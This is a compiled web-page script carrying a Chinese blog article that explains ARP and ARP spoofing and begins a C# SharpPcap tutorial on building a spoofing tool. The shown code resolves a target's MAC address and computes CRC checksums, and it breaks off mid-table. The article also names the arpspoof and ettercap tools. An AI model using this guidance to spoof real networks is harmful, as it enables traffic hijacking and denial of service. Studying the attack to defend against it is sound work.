import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as c,o,c as u,a as s,b as n,d as p,f as t}from"./app-c8fe265f.js";const l="/assets/1-d81bbac2.png",i="/assets/2-2339a3b2.png",r="/assets/3-b012ded7.png",k="/assets/4-a92dc7bc.png",d="/assets/5-db234bd5.png",b="/assets/6-7001b56b.png",m="/assets/7-b81c31e8.png",v="/assets/8-2dfbbfbd.png",x={},f={href:"https://www.freebuf.com/articles/network/210852.html",target:"_blank",rel:"noopener noreferrer"},g=t('<h2 id="引言" tabindex="-1"><a class="header-anchor" href="#引言" aria-hidden="true">#</a> 引言</h2><p>未知攻，焉知防，本文仅研究ARP欺骗攻击防护用！</p><hr><h2 id="什么是arp协议" tabindex="-1"><a class="header-anchor" href="#什么是arp协议" aria-hidden="true">#</a> 什么是ARP协议</h2><p>官话： 在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。而在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。这就导致在以太网中使用IP协议时，数据链路层的以太网协议接到上层IP协议提供的数据中，只包含目的主机的IP地址。于是需要一种方法，根据目的主机的IP地址，获得其MAC地址。这就是ARP协议要做的事情。所谓地址解析（address resolution）就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。 -- Extracted from WikiPedia.</p><p><strong>通俗点说，在局域网中通信时使用的是MAC地址，而不是常见的IP地址。所以在局域网的两台主机间通信时，必须要知道对方的MAC地址，这就时ARP协议要做的事：将IP地址转换为MAC地址。</strong></p><p>从以太网帧来看，以太网帧分为：以太网首部、上层数据部分、以太网尾，三部分。在物理层传输的数据都是使用以太网帧来封装起来传输的（通俗的说就是在数据包头加上以太网首部，数据包尾加上以太网尾），而网络传输是分层进行的，也就是物理层只处理物理层的数据，对于以太网帧中的上层数据部分并不关心。在以太网帧中，以太网首部中存放了目的主机的MAC地址和源主机的MAC用于在以太网中传输数据。所以，在以太网通信中，只知道对方的IP地址是不可以通信的，因为IP地址属于第三层（网络层）的地址，对于物理层的以太网帧来说IP地址属于上层数据部分，以太网是无法识别的，所以就要使用ARP协议获取到对方的MAC地址进行通信。</p><figure><img src="'+l+'" alt="802.3 以太网帧结构" tabindex="0" loading="lazy"><figcaption>802.3 以太网帧结构</figcaption></figure><hr><h2 id="arp是如何工作的" tabindex="-1"><a class="header-anchor" href="#arp是如何工作的" aria-hidden="true">#</a> ARP是如何工作的？</h2><p>举个栗子：现在有两台处于同一局域网的主机A、B。</p><table><thead><tr><th>主机</th><th>IP地址</th><th>MAC地址</th></tr></thead><tbody><tr><td>A</td><td>192.168.1.1</td><td>0A-11-22-33-44-01</td></tr><tr><td>B</td><td>192.168.1.2</td><td>0A-11-22-33-44-02</td></tr></tbody></table><p>现在主机A要和主机B通信，那么根据上面的介绍可以知道，主机A仅有主机B的IP地址是不可以通信的，还要知道主机B的MAC地址，下面介绍主机A是如何通过ARP协议获取主机B的MAC地址的：</p><p>第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</p><p>第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求</p><p>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</p><p>第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><p>了解ARP协议的工作原理后可以分析出其存在一个严重的安全问题： 在ARP回复时，发送请求包的主机A并不会验证ARP回复包的真实性，也就是不能判断回复主机A的是不是主机B。由此引出一个局域网攻击方式ARP欺骗。</p><hr><h2 id="什么是arp欺骗" tabindex="-1"><a class="header-anchor" href="#什么是arp欺骗" aria-hidden="true">#</a> 什么是ARP欺骗</h2><p>举个栗子：</p><table><thead><tr><th>主机</th><th>IP</th><th>MAC</th></tr></thead><tbody><tr><td>A</td><td>192.168.1.1</td><td>0A-11-22-33-44-01</td></tr><tr><td>B</td><td>192.168.1.2</td><td>0A-11-22-33-44-02</td></tr><tr><td>C</td><td>192.168.1.3</td><td>0A-11-22-33-44-03</td></tr></tbody></table><p>1.主机A要和主机C通信，主机A发出ARP包询问谁是192.168.1.3?请回复192.168.1.1</p><p>2.这时主机B在疯狂的向主机A回复，我是192.168.1.3，我的地址是0A-11-22-33-44-02</p><p>3.由于ARP协议不会验证回复者的身份，造成主机A错误的将192.168.1.3的MAC映射为0A-11-22-33-44-02。</p><p><strong>ARP欺骗的分类</strong> 1.主机欺骗，如同上面的栗子，主机B欺骗局域网中的主机A。 2.网关欺骗，局域网中的主机欺骗网关，从而获取其他主机的进流量。</p><h2 id="arp攻击的危害1-造成局域网中的其他主机断网。2-劫持局域网中其他主机或网关的流量-获取敏感信息-甚至引发进一步的dns欺骗等。" tabindex="-1"><a class="header-anchor" href="#arp攻击的危害1-造成局域网中的其他主机断网。2-劫持局域网中其他主机或网关的流量-获取敏感信息-甚至引发进一步的dns欺骗等。" aria-hidden="true">#</a> <strong>ARP攻击的危害</strong> 1.造成局域网中的其他主机断网。 2.劫持局域网中其他主机或网关的流量，获取敏感信息，甚至引发进一步的DNS欺骗等。</h2><h2 id="如何实现arp攻击" tabindex="-1"><a class="header-anchor" href="#如何实现arp攻击" aria-hidden="true">#</a> 如何实现ARP攻击</h2><p><strong>找轮子</strong> 例如kali下的arpspoof、ettercap等工具。</p><p><strong>造轮子</strong> 首先介绍下LibPacp： LibPcap是一个UNIX下的C函数库，它提供的API，能获取和过滤从任意一块网卡在数据链路层上的帧。不同的UNIX系统有不同的架构去处理数据链路层上的数据帧，所以程序员如果想要写一个能运行在UNIX上的、直接读取或者操作数据链路层上的帧的应用程序，他就不得不专门为这个特点版本的UNIX写一个访问帧的函数。libpcap的目的就是提供一个抽象层，这样程序员就能编写可运行在所有版本的UNIX上的包获取和分析工具了。</p><p>然后是WinPcap: WinPcap是一个专为Windows系统设计的、基于libpcap的库。大多数Windows下的网络流量分析工具都是基于WinPcap开发的，比如Wireshark。</p><p>接着是SharpPcap： SharpPcap是封装好WinPcap和LibPcap的C#库。</p><p>除了知道开发用的库还要知道以太网帧和ARP报文的结构（SharpPcap提供的封装好的方法，为了学习还是自己造轮子）：</p><figure><img src="'+i+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>第一部分：以太网首部 也可以说是以太网帧的头部，这部分包括了目标主机的MAC地址、源主机的MAC地址、上层协议类型 第二部分：ARP报文 这部分中的第20位，0x00,0x01表示ARP请求包,0x00,0x02表示应答包。 由于以太网帧最短长度为64个字节，由于ARP报文加上以太网头不足64个字节，所以要填充18个字节的0x00 第三部分：FCS帧校验序列 即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段4个字节的循环冗余校验码。源节点发送数据帧时，由帧的帧头和数据部分计算得出FCS，目的节点接收到后，用同样的方式再计算一遍FCS，如果与接收到的FCS不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。</p><p>知道了ARP欺骗的原理和ARP数据包的格式后，只要构造出一个ARP欺骗包，重复向目标主机发出就可以了。 原理很简单，实现起来稍有一点难度： 首先要先要获取本机的IP地址和MAC地址，下面的Deemo中给出了SharpPacp获取本机IPv4地址和MAC地址的方法:</p><figure><img src="'+r+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>',38),h={href:"http://sharppcap.sourceforge.net/htmldocs/SharpPcap.LibPcap/Sockaddr+AddressTypes.html",target:"_blank",rel:"noopener noreferrer"},P=t(`<p>接下来还要获取到目标主机的地址信息，IP地址和MAC可以手动指定，为了更加人性化的入狱操作，当然要根据输入的IP自动获得MAC地址了，原理如下： 知道ARP原理了，获取对方的MAC地址只要向对方发送一个ARP请求包然后监听网卡就可以了。 代码如下：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>summary</span><span class="token punctuation">&gt;</span></span></span>
<span class="token doc-comment comment">/// 发送ARP请求包，根据返回的应答包获取MAC地址</span>
<span class="token doc-comment comment">/// <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>summary</span><span class="token punctuation">&gt;</span></span></span>
<span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">ScanLAN</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> recipientIP<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> senderMAC<span class="token punctuation">,</span><span class="token class-name"><span class="token keyword">string</span></span> senderIP<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// 构造Arp请求包</span>
	<span class="token class-name"><span class="token keyword">var</span></span> arpPackets <span class="token operator">=</span> <span class="token function">BuildRequest</span><span class="token punctuation">(</span>IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>recipientIP<span class="token punctuation">)</span><span class="token punctuation">,</span> PhysicalAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>senderMAC<span class="token punctuation">)</span><span class="token punctuation">,</span> IPAddress<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>senderIP<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//创建一个“tcpdump”过滤器，只允许读取arp回复</span>
	<span class="token class-name">String</span> arpFilter <span class="token operator">=</span> <span class="token string">&quot;arp and ether dst &quot;</span> <span class="token operator">+</span> senderMAC<span class="token punctuation">;</span>

	<span class="token comment">//open the device with 20ms timeout 打开设备，设置超时时间20ms</span>
	_device<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>DeviceMode<span class="token punctuation">.</span>Promiscuous<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//set the filter    设置过滤器</span>
	_device<span class="token punctuation">.</span>Filter <span class="token operator">=</span> arpFilter<span class="token punctuation">;</span>

	<span class="token comment">//初始化扫描线程</span>
	scanThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span>
	<span class="token punctuation">{</span>
		<span class="token class-name"><span class="token keyword">var</span></span> lastRequestTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span><span class="token function">FromBinary</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name"><span class="token keyword">var</span></span> requestInterval <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">TimeSpan</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name"><span class="token keyword">var</span></span> timeoutDateTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now <span class="token operator">+</span> timeout<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>DateTime<span class="token punctuation">.</span>Now <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> timeoutDateTime<span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>requestInterval <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span> <span class="token punctuation">(</span>DateTime<span class="token punctuation">.</span>Now <span class="token operator">-</span> lastRequestTime<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token comment">// inject the packet to the wire 发送请求包</span>
				_device<span class="token punctuation">.</span><span class="token function">SendPacket</span><span class="token punctuation">(</span>arpPackets<span class="token punctuation">)</span><span class="token punctuation">;</span>
				lastRequestTime <span class="token operator">=</span> DateTime<span class="token punctuation">.</span>Now<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">//read the next packet from the network</span>
			<span class="token class-name"><span class="token keyword">var</span></span> reply <span class="token operator">=</span> _device<span class="token punctuation">.</span><span class="token function">GetNextPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//获取网卡中的下一个包，过滤出ARP</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>reply <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>  <span class="token comment">//下一个包为空时，跳过本次循环</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">// parse the packet 解析数据包</span>
			<span class="token class-name"><span class="token keyword">var</span></span> packet <span class="token operator">=</span> PacketDotNet<span class="token punctuation">.</span>Packet<span class="token punctuation">.</span><span class="token function">ParsePacket</span><span class="token punctuation">(</span>reply<span class="token punctuation">.</span>LinkLayerType<span class="token punctuation">,</span> reply<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// is this an arp packet? 这是一个arp数据包吗？</span>
			<span class="token class-name"><span class="token keyword">var</span></span> arpPacket <span class="token operator">=</span> PacketDotNet<span class="token punctuation">.</span>ARPPacket<span class="token punctuation">.</span><span class="token function">GetEncapsulated</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>arpPacket <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token comment">//if this is the reply we&#39;re looking for, stop  //ARP包中的源主机IP 等于 UI中的目标主机IP</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>arpPacket<span class="token punctuation">.</span>SenderProtocolAddress<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Equals</span><span class="token punctuation">(</span>recipientIP<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token comment">// 通知事件 -更新靶机MAC</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>ResolvedEvent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					<span class="token function">ResolvedEvent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arpPacket<span class="token punctuation">.</span>SenderHardwareAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>

		_device<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//关闭设备</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	scanThread<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//启动线程</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>代码解析： 创建一个线程专门用来发送ARP请求包和解析网卡中收到的ARP应答包，启动线程发送一个包后，检测网卡数据，并过滤出所有网卡中的ARP数据包，然后对包进行解析，如果包中的源主机IP是构造的包中的目标主机证明这个包是刚才发送的请求包的应答包，然后1.通知事件更新UI、2.结束线程、3.关闭设备</p><p>得到本机地址信息和目标主机的地址信息后，只要将之前构造的包中的相应的地址信息体替换掉就好了</p><figure><img src="`+k+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>除了要换掉包中的地址信息，还要在尾部加上FCS校验码： 什么是FCS校验码？ FCS：Frame Check Sequence（帧校验序列），俗称帧尾，即计算机网络数据链路层的协议数据单元（帧）的尾部字段，是一段4个字节的循环冗余校验码。源节点发送数据帧时，由帧的帧头和数据部分计算得出FCS，目的节点接收到后，用同样的方式再计算一遍FCS，如果与接收到的FCS不同，则认为帧在传输过程中发生了错误，从而选择丢弃这个帧。 FCS提供了一种错误检测机制，用来验证帧在传输过程中的完整性。 FCS采用了循环冗余校验CRC32校验算法，那么什么是CRC校验呢？ CRC校验通俗点讲，就是将给出的二进制数据与一个固定的多项式进行莫2除计算，得出的余数就是CRC校验码。 举个栗：计算4位的CRC校验码</p><figure><img src="'+d+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>知道CRC计算原理后，再来看一下CRC-4的实现: 原始的 CRC 校验算法: 根据多项式除法，我们就可以得到原始的 CRC 校验算法。假设生成多项式 g(x) 是 r 阶的，原始数据存放在 data 中，长度为 len 个 bit ， reg 是 r+1 位的变量。 以 CRC-4 为例，生成多项式 g(x)=x^4 + x + 1 ，对应了一个 5bits 的二进制数字 10011 ，那么 reg 就是 5 bits 。</p><p>reg[1] 表明 reg 的最低位， reg[r+1] 是 reg 的最高位。</p><p>通过反复的移位和进行除法，那么最终该寄存器中的值去掉最高一位就是我们所要求的余数。所以可以将上述步骤用下面的流程描述：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code>reg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
data <span class="token operator">=</span> data追加r个<span class="token punctuation">;</span>
pos <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">while</span><span class="token punctuation">(</span>pos <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">=</span> len<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>reg<span class="token punctuation">[</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 表明reg可以除以g(x)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// 只关心余数，根据上面的算法规则可知就是XOR运算</span>
        reg <span class="token operator">=</span> reg <span class="token return-type class-name">XOR</span> <span class="token function">g</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 移出最高位，移入新数据</span>
    reg <span class="token operator">=</span> <span class="token punctuation">(</span>reg<span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    pos<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">return</span> reg<span class="token punctuation">;</span> <span class="token comment">// reg中的后r位存储的就是余数</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上面只是简述一下CRC算法的原理，如果采用CRC-4的原始算法实现速度很慢计算一个ARP数据包的CRC32码大约亲测需要十几秒左右的时间，由于CRC32算法实现比较复杂，这里不再做论述，直接上大神写的CRC-32算法实现代码：</p><div class="language-csharp line-numbers-mode" data-ext="cs"><pre class="language-csharp"><code><span class="token comment">//CRC32计算表</span>
<span class="token class-name">UInt32<span class="token punctuation">[</span><span class="token punctuation">]</span></span> crcTable <span class="token operator">=</span>
<span class="token punctuation">{</span>

  <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x04c11db7</span><span class="token punctuation">,</span> <span class="token number">0x09823b6e</span><span class="token punctuation">,</span> <span class="token number">0x0d4326d9</span><span class="token punctuation">,</span> <span class="token number">0x130476dc</span><span class="token punctuation">,</span> <span class="token number">0x17c56b6b</span><span class="token punctuation">,</span> <span class="token number">0x1a864db2</span><span class="token punctuation">,</span> <span class="token number">0x1e475005</span><span class="token punctuation">,</span>

  <span class="token number">0x2608edb8</span><span class="token punctuation">,</span> <span class="token number">0x22c9f00f</span><span class="token punctuation">,</span> <span class="token number">0x2f8ad6d6</span><span class="token punctuation">,</span> <span class="token number">0x2b4bcb61</span><span class="token punctuation">,</span> <span class="token number">0x350c9b64</span><span class="token punctuation">,</span> <span class="token number">0x31cd86d3</span><span class="token punctuation">,</span> <span class="token number">0x3c8ea00a</span><span class="token punctuation">,</span> <span class="token number">0x384fbdbd</span><span class="token punctuation">,</span>

  <span class="token number">0x4c11db70</span><span class="token punctuation">,</span> <span class="token number">0x48d0c6c7</span><span class="token punctuation">,</span> <span class="token number">0x4593e01e</span><span class="token punctuation">,</span> <span class="token number">0x4152fda9</span><span class="token punctuation">,</span> <span class="token number">0x5f15adac</span><span class="token punctuation">,</span> <span class="token number">0x5bd4b01b</span><span class="token punctuation">,</span> <span class="token number">0x569796c2</span><span class="token punctuation">,</span> <span class="token number">0x52568b75</span><span class="token punctuation">,</span>

  <span class="token number">0x6a1936c8</span><span class="token punctuation">,</span> <span class="token number">0x6ed82b7f</span><span class="token punctuation">,</span> <span class="token number">0x639b0da6</span><span class="token punctuation">,</span> <span class="token number">0x675a1011</span><span class="token punctuation">,</span> <span class="token number">0x791d4014</span><span class="token punctuation">,</span> <span class="token number">0x7ddc5da3</span><span class="token punctuation">,</span> <span class="token number">0x709f7b7a</span><span class="token punctuation">,</span> <span class="token number">0x745e66cd</span><span class="token punctuation">,</span>

  <span class="token number">0x9823b6e0</span><span class="token punctuation">,</span> <span class="token number">0x9ce2ab57</span><span class="token punctuation">,</span> <span class="token number">0x91a18d8e</span><span class="token punctuation">,</span> <span class="token number">0x95609039</span><span class="token punctuation">,</span> <span class="token number">0x8b27c03c</span><span class="token punctuation">,</span> <span class="token number">0x8fe6dd8b</span><span class="token punctuation">,</span> <span class="token number">0x82a5fb52</span><span class="token punctuation">,</span> <span class="token number">0x8664e6e5</span><span class="token punctuation">,</span>

  <span class="token number">0xbe2b5b58</span><span class="token punctuation">,</span> <span class="token number">0xbaea46ef</span><span class="token punctuation">,</span> <span class="token number">0xb7a96036</span><span class="token punctuation">,</span> <span class="token number">0xb3687d81</span><span class="token punctuation">,</span> <span class="token number">0xad2f2d84</span><span class="token punctuation">,</span> <span class="token number">0xa9ee3033</span><span class="token punctuation">,</span> <span class="token number">0xa4ad16ea</span><span class="token punctuation">,</span> <span class="token number">0xa06c0b5d</span><span class="token punctuation">,</span>

  <span class="token number">0xd4326d90</span><span class="token punctuation">,</span> <span class="token number">0xd0f37027</span><span class="token punctuation">,</span> <span class="token number">0xddb056fe</span><span class="token punctuation">,</span> <span class="token number">0xd9714b49</span><span class="token punctuation">,</span> <span class="token number">0xc7361b4c</span><span class="token punctuation">,</span> <span class="token number">0xc3f706fb</span><span class="token punctuation">,</span> <span class="token number">0xceb42022</span><span class="token punctuation">,</span> <span class="token number">0xca753d95</span><span class="token punctuation">,</span>

  <span class="token number">0xf23a8028</span><span class="token punctuation">,</span> <span class="token number">0xf6fb9d9f</span><span class="token punctuation">,</span> <span class="token number">0xfbb8bb46</span><span class="token punctuation">,</span> <span class="token number">0xff79a6f1</span><span class="token punctuation">,</span> <span class="token number">0xe13ef6f4</span><span class="token punctuation">,</span> <span class="token number">0xe5ffeb43</span><span class="token punctuation">,</span> <span class="token number">0xe8bccd9a</span><span class="token punctuation">,</span> <span class="token number">0xec7dd02d</span><span class="token punctuation">,</span>

  <span class="token number">0x34867077</span><span class="token punctuation">,</span> <span class="token number">0x30476dc0</span><span class="token punctuation">,</span> <span class="token number">0x3d044b19</span><span class="token punctuation">,</span> <span class="token number">0x39c556ae</span><span class="token punctuation">,</span> <span class="token number">0x278206ab</span><span class="token punctuation">,</span> <span class="token number">0x23431b1c</span><span class="token punctuation">,</span> <span class="token number">0x2e003dc5</span><span class="token punctuation">,</span> <span class="token number">0x2ac12072</span><span class="token punctuation">,</span>

  <span class="token number">0x128e9dcf</span><span class="token punctuation">,</span> <span class="token number">0x164f8078</span><span class="token punctuation">,</span> <span class="token number">0x1b0ca6a1</span><span class="token punctuation">,</span> <span class="token number">0x1fcdbb16</span><span class="token punctuation">,</span> <span class="token number">0x018aeb13</span><span class="token punctuation">,</span> <span class="token number">0x054bf6a4</span><span class="token punctuation">,</span> <span class="token number">0x0808d07d</span><span class="token punctuation">,</span> <span class="token number">0x0cc9cdca</span><span class="token punctuation">,</span>

  <span class="token number">0x7897ab07</span><span class="token punctuation">,</span> <span class="token number">0x7c56b6b0</span><span class="token punctuation">,</span> <span class="token number">0x71159069</span><span class="token punctuation">,</span> <span class="token number">0x75d48dde</span><span class="token punctuation">,</span> <span class="token number">0x6b93dddb</span><span class="token punctuation">,</span> <span class="token number">0x6f52c06c</span><span class="token punctuation">,</span> <span class="token number">0x6211e6b5</span><span class="token punctuation">,</span> <span class="token number">0x66d0fb02</span><span class="token punctuation">,</span>

  <span class="token number">0x5e9f46bf</span><span class="token punctuation">,</span> <span class="token number">0x5a5e5b08</span><span class="token punctuation">,</span> <span class="token number">0x571d7dd1</span><span class="token punctuation">,</span> <span class="token number">0x53dc6066</span><span class="token punctuation">,</span> <span class="token number">0x4d9b3063</span><span class="token punctuation">,</span> <span class="token number">0x495a2dd4</span><span class="token punctuation">,</span> <span class="token number">0x44190b0d</span><span class="token punctuation">,</span> <span class="token number">0x40d816ba</span><span class="token punctuation">,</span>

  <span class="token number">0xaca5c697</span><span class="token punctuation">,</span> <span class="token number">0xa864db20</span><span class="token punctuation">,</span> <span class="token number">0xa527fdf9</span><span class="token punctuation">,</span> <span class="token number">0xa1e6e04e</span><span class="token punctuation">,</span> <span class="token number">0xbfa1b04b</span><span class="token punctuation">,</span> <span class="token number">0xbb60adfc</span><span class="token punctuation">,</span> <span class="token number">0xb6238b25</span><span class="token punctuation">,</span> <span class="token number">0xb2e29692</span><span class="token punctuation">,</span>

  <span class="token number">0x8aad2b2f</span><span class="token punctuation">,</span> <span class="token number">0x8e6c3698</span><span class="token punctuation">,</span> <span class="token number">0x832f1041</span><span class="token punctuation">,</span> <span class="token number">0x87ee0df6</span><span class="token punctuation">,</span> <span class="token number">0x99a95df3</span><span class="token punctuation">,</span> <span class="token number">0x9d684044</span><span class="token punctuation">,</span> <span class="token number">0x902b669d</span><span class="token punctuation">,</span> <span class="token number">0x94ea7b2a</span><span class="token punctuation">,</span>

  <span class="token number">0xe0b41de7</span><span class="token punctuation">,</span> <span class="token number">0xe4750050</span><span class="token punctuation">,</span> <span class="token number">0xe9362689</span><span class="token punctuation">,</span> <span class="token number">0xedf73b3e</span><span class="token punctuation">,</span> <span class="token number">0xf3b06b3b</span><span class="token punctuation">,</span> <span class="token number">0xf771768c</span><span class="token punctuation">,</span> <span class="token number">0xfa325055</span><span class="token punctuation">,</span> <span class="token number">0xfef34de2</span><span class="token punctuation">,</span>

  <span class="token number">0xc6bcf05f</span><span class="token punctuation">,</span> <span class="token number">0xc27dede8</span><span class="token punctuation">,</span> <span class="token number">0xcf3ecb31</span><span class="token punctuation">,</span> <span class="token number">0xcbffd686</span><span class="token punctuation">,</span> <span class="token number">0xd5b88683</span><span class="token punctuation">,</span> <span class="token number">0xd1799b34</span><span class="token punctuation">,</span> <span class="token number">0xdc3abded</span><span class="token punctuation">,</span> <span class="token number">0xd8fba05a</span><span class="token punctuation">,</span>

